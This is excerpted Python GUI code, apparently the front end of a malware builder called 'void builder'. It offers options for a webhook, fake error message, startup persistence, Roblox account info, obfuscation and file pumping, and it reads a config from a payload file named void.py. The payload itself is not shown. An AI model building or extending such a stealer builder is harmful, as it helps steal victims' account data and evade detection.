...
class App(customtkinter.CTk):
    def __init__(self):
        ...
        self.title("void builder | made by astral")
        ...
        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "void.png")), size=(60, 60))
        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "void.png")), size=(500, 150))
        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "void.png")), size=(20, 20))
        self.dashboard_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "home.png")), size=(30, 30))
        self.docs_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(30, 30))
        self.help_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}void.ico")
        ...
        self.frame_2_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Imformation", font=customtkinter.CTkFont(
        ...
        self.checkwebhook_button = customtkinter.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                           ...
                                                           fg_color="#121111", hover_color="#6d6d75", font=customtkinter.CTkFont(size=15, family=self.font))
        ...
        self.ping = customtkinter.CTkCheckBox(self.builder_frame, text="Ping", font=customtkinter.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#121111", hover_color="#6d6d75")
        ...
        self.pingtype = customtkinter.CTkOptionMenu(
            ...
            fg_color="#121111", button_hover_color="#6d6d75", button_color="#121111")
        ...
        self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Fake Error", font=customtkinter.CTkFont(
            size=17, family=self.font), fg_color="#121111", hover_color="#6d6d75")
        ...
        self.startup = customtkinter.CTkCheckBox(
            ...
            fg_color="#121111", hover_color="#6d6d75")
        ...
        self.roblox = customtkinter.CTkCheckBox(self.builder_frame, text="Roblox Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                                fg_color="#121111", hover_color="#6d6d75", command=self.check_roblox)
        ...
        self.obfuscation = customtkinter.CTkCheckBox(
            ...
            fg_color="#121111", hover_color="#6d6d75", command=self.check_cxfreeze)
        ...
        self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#121111", hover_color="#6d6d75", command=self.check_pumper)
        ...
        self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#121111", button_hover_color="#6d6d75", button_color="#121111")
        ...
        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", "cxfreeze", ".py"],
                                                    ...
                                                    fg_color="#121111", button_hover_color="#6d6d75", button_color="#121111", command=self.multi_commands)
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=340)
        self.fileopts.set("File Options")

        self.icon = customtkinter.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#121111", hover_color="#6d6d75",
        ...
        self.build = customtkinter.CTkButton(self.builder_frame, width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                                             fg_color="#121111", hover_color="#6d6d75", command=self.buildfile)
        ...
        self.docs = customtkinter.CTkLabel(self.second_frame, text="Information", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
    ...
    def get_config(self):
        with open(self.basefilepath + "\\void.py", 'r', encoding="utf-8") as f:
            code = f.read()
        ...
        if config_match:
            ...
            raise Exception("Could not find config in void.py")
